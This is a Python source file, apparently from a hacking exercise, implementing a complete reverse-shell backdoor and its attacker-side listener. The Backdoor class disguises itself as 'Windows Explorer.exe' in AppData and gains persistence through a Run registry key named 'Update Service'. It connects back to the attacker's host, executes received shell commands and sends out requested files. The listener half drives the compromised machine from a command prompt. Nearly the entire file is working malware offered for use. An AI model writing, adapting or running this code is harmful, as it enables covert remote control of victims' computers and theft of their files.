#!/usr/bin/env python3
#metod subprocess.check_output don't change our working directory, by cd command, it only checks this command as system command
#from bytes to list: -> list(bytearray(byte_object)) ; form list to bytes : -> bytes(list_bytes_ob)

import socket
import subprocess
import json
import os
from time import sleep
import sys
import shutil #to copy stuff in python

class Listener:
    def __init__(self , ip , port):
        listener = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR , 1)
        listener.bind((ip , port))
        listener.listen(5)
        print("[+] Waiting incoming connections")
        self.connection,self.adress = listener.accept()
        print("[+] Got a connection from " + str(self.adress))
    
    def reliable_send(self,data):
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data =json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self , command):
        if command[0] == "exit":
            self.reliable_send(command)
            self.connection.close()
            exit()
        self.reliable_send(command)
        return self.reliable_receive()

    def write_file(self,path,content):
        #content = bytes(content)
        with open(path , 'wb') as file:
            file.write(content)
            return "[+] Download successful."  

    def change_working_directory_to(self,path):
        try:
            os.chdir(path)    
            return "[+] Changing working LOCAL directory"
        except:
            return "[-] Incorrect Path.Try again!"
    
    def execute_process(self, task):
        try:
            if task[0] == "cd":
                return self.change_working_directory_to(task[1])
            result = subprocess.check_output(task ).decode()

        except:
            result = "[-] Incorrect Local command.Try again!!!"
        return result

    def empty_string(self,string_ob):
        res = ""
        for symbol in string_ob:
            if not(symbol == ' '):
                res += symbol
        return len(res) == 0

    def run(self):
        while True:
            command  = input(">> ")
            if command.startswith("--no_split"):
                command = command[11:]
                command = [command]
            elif command.startswith("cd") and len(command) > 4:
                command = command[3:]
                command = ["cd",command]
            elif self.empty_string(command):
                continue
            else:
                command = command.split()

            if command[0] == "download":
                self.reliable_send(command)
                file_bytes = self.reliable_receive()
                try:
                    message = file_bytes
                    if message.startswith("[-] No such file."):
                        print(message)
                        continue
                except:
                    True

                file_bytes = bytes(file_bytes)
                result = self.write_file(command[1] , file_bytes)
                print(result)
                continue

            if command[0] == "-l" or command[0] == "--local":
                command = command[1:]
                result = self.execute_process(command)
                print(result)
                continue
            
            result = self.execute_remotely(command)
            print(result)


class Backdoor:
    
    def __init__(self, ip ,port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        while True:
            try:
                self.connection.connect((ip, port))
                break
            except:
                sleep(2)
                continue
    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable , evil_file_location)
            subprocess.call(f'REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Update Service" /t REG_SZ /d "{evil_file_location}"')

    def execute_system_command(self, command):
        try:
            #DEVNULL = open(os.devnull , 'wb')
            result = subprocess.check_output(command, shell = True)
        except:
            result = "[-] Incorrect victim command. Try Again!"
        return result

    def reliable_send(self,data):
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data =json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def change_working_directory_to(self,path):
        try: 
            os.chdir(path)    
            return "[+] Changing victim working directory to " + path
        except:
            return "[-] Incorrect path. Try Again!"

    def read_file(self,path):
        res_bytes = None
        try:
            with open(path ,'rb') as file:
                res_bytes =  file.read()
        except:
            return "[-] No such file."
        res_bytes = bytearray(res_bytes)
        res_bytes = list(res_bytes)
        return res_bytes
    
    def background_execute(self,command):
        subprocess.Popen(command , shell = True)
        return "[+] Command startes in background"

    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == "exit":
                self.connection.close()
                sys.exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory_to(command[1])
            elif command[0] == "download":
                file_bytes = self.read_file(command[1])
                self.reliable_send(file_bytes)
                continue
            elif command[0] == "&":
                command = command[1:]
                command_result = self.background_execute(command)
            else:
                command_result = self.execute_system_command(command)
                if not isinstance(command_result , str):
                    command_result = command_result.decode('cp1251')
            self.reliable_send(command_result)
